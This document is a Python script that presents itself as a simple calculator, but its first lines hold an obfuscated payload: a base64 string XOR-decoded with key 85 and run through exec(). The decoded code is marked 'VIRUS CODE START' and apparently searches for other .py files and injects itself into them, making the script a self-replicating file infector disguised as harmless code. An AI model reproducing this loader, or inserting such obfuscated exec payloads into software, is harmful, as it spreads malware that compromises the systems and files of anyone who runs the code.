
import base64
def decrypt(c,k):
 try:
  d=base64.b64decode(c).decode()
  return ''.join(chr(ord(x)^k)for x in d)
 except:return''
exec(decrypt('X3Z1eHh4dQMcBwAGdRYaERB1BgEUBwF1eHh4Xzw4JTonIXU6Jl88OCU6JyF1OToyMjw7Ml88OCU6JyF1JTk0ITM6JzhfMyc6OHUxNCEwITw4MHU8OCU6JyF1MTQhMCE8ODBfPDglOichdTc0JjBjYV88OCU6JyF1JzQ7MTo4Xzw4JTonIXUnMF9fdnXphJjnvLvmlrDlvoJfOToyMjw7Mns3NCY8NhY6OzM8Mn1fdXV1dTM8OTA7NDgwaHJ7eiM8JyAmezk6MnJ5X3V1dXU5MCMwOWg5OjIyPDsyexwbExp5X3V1dXUzOic4NCFocnB9NCY2ITw4MHwmdXh1cH05MCMwOTs0ODB8JnV4dXB9ODAmJjQyMHwmcnlfdXV1dTM6JzYwaAEnIDBffF9fMTAzdTA7NicsJSEKNjoxMH02OjEwb3UmISd5dT4wLG91PDshdWh1Gzo7MHx1eGt1ISAlOTAOJiEneXU8OyEIb191dXV1d3d35Lyq55W95b2X5omD5Yu15a6T5ZOZNzQmMGNh572D56GU5a6s5Lq256GU6L6O6KCZ5Yu15a6Td3d3X3V1dXU8M3U+MCx1PCZ1Gzo7MG9fdXV1dXV1dXU+MCx1aHUnNDsxOjh7JzQ7MTw7IX1keXVnYGB8X3V1dXUwOzYnLCUhMDF1aHVycns/Ojw7fTY9J306JzF9Nnx1C3U+MCx8dTM6J3U2dTw7dTY6MTB8X3V1dXUwOzY6MTAxdWh1NzQmMGNhezdjYTA7NjoxMH0wOzYnLCUhMDF7MDs2OjEwfXx8ezEwNjoxMH18X3V1dXUnMCEgJzt1MDs2OjEwMXl1PjAsX18xMDN1MTA2JywlIQo2OjEwfTA7NjoxMDFvdSYhJ3l1PjAsb3U8OyF8dXhrdSYhJ29fdXV1dXd3d+imtuWuk+S6tuehlHd3d191dXV1IScsb191dXV1dXV1dTEwNjoxMDF1aHU3NCYwY2F7N2NhMTA2OjEwfTA7NjoxMDF8ezEwNjoxMH18X3V1dXV1dXV1MTA2JywlITAxdWh1cnJ7Pzo8O302PSd9OicxfTZ8dQt1PjAsfHUzOid1NnU8O3UxMDY6MTAxfF91dXV1dXV1dScwISAnO3UxMDYnLCUhMDFfdXV1dTAtNjAlIXUQLTYwJSE8Ojt1NCZ1MG9fdXV1dXV1dXU5OjIyPDsyezAnJzonfTN36Ka25a6T5aWk6LWwb3UuJiEnfTB8KHd8X3V1dXV1dXV1JzAhICc7dRs6OzBfXzEwM3U2PTA2PgowOyM8Jzo7ODA7IX18b191dXV1d3d35qKV5p6w6L6F6KCZ54+65aOW55uR5a+c5YS95oGyd3d3X3V1dXUhJyxvX3V1dXV1dXV1NiAnJzA7IQoxPCd1aHU6JnslNCE9ezc0JjA7NDgwfTomezIwITYiMX18fF91dXV1dXV1dTwzdTs6IXV9NiAnJzA7IQoxPCd1aGh1ciEwJiFydTondXIhMCYhcnU8O3U2ICcnMDshCjE8J3s5OiIwJ318fG9fdXV1dXV1dXV1dXV1OToyMjw7MnsiNCc7PDsyfXfkuZjlnb3mtJ7oroDnmrvlvIDkubjvvZnkua/lr5zlhL3otKLoppTlgInmrLfmiLLooJl3fF91dXV1dXV1dXV1dXUnMCEgJzt1EzQ5JjBfdXV1dXV1dXU8M3U7OiF1OiZ7NDY2MCYmfXJ7cnl1OiZ7AgoaHnxvX3V1dXV1dXV1dXV1dTk6MjI8OzJ7IjQnOzw7Mn135byG5YiY55q75byA5rO05p2c5YeM5YSw5pyW6ZiFd3xfdXV1dXV1dXV1dXV1JzAhICc7dRM0OSYwX3V1dXV1dXV1OToyMjw7Mns8OzM6fTN35pKY5LyJ57Ku57qKb3UuJTk0ITM6Jzh7JiwmITA4fXwodS4lOTQhMzonOHsnMDkwNCYwfXwod3xfdXV1dXV1dXU5OjIyPDsyezw7Mzp9M3fmiLLooJnnmrvlvIBvdS46JnsyMCE2IjF9fCh3fF91dXV1dXV1dScwISAnO3UBJyAwX3V1dXUwLTYwJSF1EC02MCUhPDo7dTQmdTBvX3V1dXV1dXV1OToyMjw7MnswJyc6J30zd+ePuuWjluaileaesOWlpOi1sG91LiYhJ30wfCh3fF91dXV1dXV1dScwISAnO3UTNDkmMF9fMTAzdTIwIQojPCcgJn18b191dXV1d3d36I+i5Y6D55aQ5q6H5Lq256GUd3d3X3V1dXUhJyxvX3V1dXV1dXV1IjwhPXU6JTA7fQoKMzw5MAoKeXVyJ3J8dTQmdTNvX3V1dXV1dXV1dXV1dTY6OyEwOyF1aHUzeycwNDF9fF91dXV1dXV1dTwzdXIwLTA2fTEwNicsJSF9cnU8O3U2Ojsh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',85))
#!/usr/bin/env python3

def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

if __name__ == "__main__":
    print("Simple Calculator")
    print("10 + 5 =", add(10, 5))
    print("10 - 5 =", subtract(10, 5)) 